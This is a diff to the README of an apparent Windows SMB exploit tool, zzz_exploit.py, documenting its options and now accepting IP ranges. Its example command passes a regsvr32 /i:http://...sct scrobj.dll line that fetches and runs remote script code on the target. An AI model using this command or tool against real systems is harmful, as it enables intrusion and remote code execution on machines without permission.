@@ -14,6 +14,7 @@ However, the module Korey used in that blog article was not available in my vers
 The zzz_exploit.py found in this repo is the same exploit logic. But it has been made more dynamic. It is now possible to pass user and password with the -u and -p, respectively. A command to write to a service is passed with the -c option and the target and pipe are -t and -p. 
 
 Logger.py is just a script I've been reusing with all my code to prettify output. If deleted, zzz will break :)
+ip_parser.py is just a script for parsing different IP/network formats. (192.168.0.0/24, 192.168.0.0-150, etc)
 
 Here is the full help page output:
 ```
@@ -45,7 +46,7 @@ optional arguments:
   -c , --command    Command to add to service
   -P , --pipe       Pipe to connect to
   --version         show program's version number and exit
-Example: python zzz_exploit -t 192.168.0.1 -c 'regsvr32 /s /n /u /i:http://192.168.0.1:9000/1EsrjpXH2pWdgd.sct scrobj.dll'
+Example: python zzz_exploit -t 192.168.0.1-100 -c 'regsvr32 /s /n /u /i:http://192.168.0.1:9000/1EsrjpXH2pWdgd.sct scrobj.dll'
 ```
 
 Sample output:
